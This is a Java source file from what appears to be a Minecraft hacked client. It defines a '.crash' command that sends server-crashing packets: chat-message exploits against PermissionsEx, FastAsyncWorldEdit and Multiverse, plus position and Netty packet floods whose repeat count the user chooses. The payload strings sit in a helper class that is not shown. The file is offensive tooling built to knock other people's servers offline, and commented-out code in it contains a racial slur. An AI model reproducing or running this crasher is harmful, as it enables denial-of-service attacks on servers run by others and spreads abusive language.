package cn.hanabi.command.commands;

import cn.hanabi.Hanabi;
import cn.hanabi.Wrapper;
import cn.hanabi.command.Command;
import cn.hanabi.gui.notifications.Notification;
import cn.hanabi.utils.ClientUtil;
import cn.hanabi.utils.PlayerUtil;
import cn.hanabi.utils.crasher.CrashUtils;
import net.minecraft.network.play.client.C01PacketChatMessage;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class CrashCommand extends Command {

    public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "Rsc1", "Rsc2", "Netty"};

    CrashUtils crashUtils = new CrashUtils();


    public CrashCommand() {
        super("crash");
    }

    @Override
    public void run(String alias, @NotNull String[] args) {
        if (args.length < 1) {
            ClientUtil.sendClientMessage("Usage: ." + alias + " method_name/list <amount> delay(ms)", Notification.Type.INFO);
            return;
        }

        int amounts = 5;
        String CrashType = args[0];

        if (args.length > 1)
            amounts = Integer.parseInt(args[1]);

        int value = amounts;

        if (mc.isSingleplayer()) {
            ClientUtil.sendClientMessage("Not Support", Notification.Type.ERROR);
        } else {
            try {
                Hanabi.INSTANCE.packetQueue.clear();
                Hanabi.INSTANCE.timing = 0;

                switch (CrashType.toLowerCase()) {
                    case "pex": //Pex (outdated)
                        Wrapper.sendPacketNoEvent(new C01PacketChatMessage(crashUtils.pexcrashexp1));
                        Wrapper.sendPacketNoEvent(new C01PacketChatMessage(crashUtils.pexcrashexp2));
                        break;
                    case "fawe": //Old Fawe  (outdated)
                        Wrapper.sendPacketNoEvent(new C01PacketChatMessage(crashUtils.fawe));
                        break;
                    case "mv": //Mv (outdated)
                        Wrapper.sendPacketNoEvent(new C01PacketChatMessage(crashUtils.mv));
                        break;
                    case "position":
                        crashUtils.custombyte(value);
                        break;
                    case "rsc1":
                 //       IChatComponent[] iTextComponentArray = new IChatComponent[]{new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText("")};
                 //       iTextComponentArray[0] = new ChatComponentText(crashUtils.pdw);

                 //         mc.getNetHandler().addToSendQueue(new C12PacketUpdateSign(BlockPos.ORIGIN, iTextComponentArray));
                        break;
                    case "rsc2":
                 //       Wrapper.sendPacketNoEvent(new C12PacketUpdateSign(BlockPos.ORIGIN,
                 //               new IChatComponent[]{new ChatComponentText(crashUtils.pdw2), new ChatComponentText("nigga"), new ChatComponentText("doyoulovemekid"), new ChatComponentText("ezmyfriend")}));
                        break;
                    case "netty":
                        crashUtils.crashdemo("a", 0, 1500, 5, false, CrashUtils.CrashType.PLACE, amounts);
                        break;
                    case "list":
                        PlayerUtil.tellPlayer(Arrays.toString(crashType));
                        break;
                    default:
                        PlayerUtil.tellPlayer("Couldn't Find the Crash Type");
                }
                ClientUtil.sendClientMessage("Success Added Methods to Queue" + " " + CrashType, Notification.Type.INFO);

            } catch (Throwable ignore) {
                ignore.printStackTrace();
                ClientUtil.sendClientMessage("Got a error When you do" + " " + CrashType, Notification.Type.ERROR);
            }
        }

    }

    @Override
    public List<String> autocomplete(int arg, String[] args) {
        String prefix = "";
        boolean flag = false;

        try {
            if (arg == 0) {
                flag = true;
            } else if (arg == 1) {
                flag = true;
            }
        } catch (Exception e) {
            // TODO: handle exception
        }

        ArrayList<String> crashtype = new ArrayList<>(Arrays.asList(crashType));

        if (flag) {
            return crashtype;
        } else return new ArrayList<>();
    }
}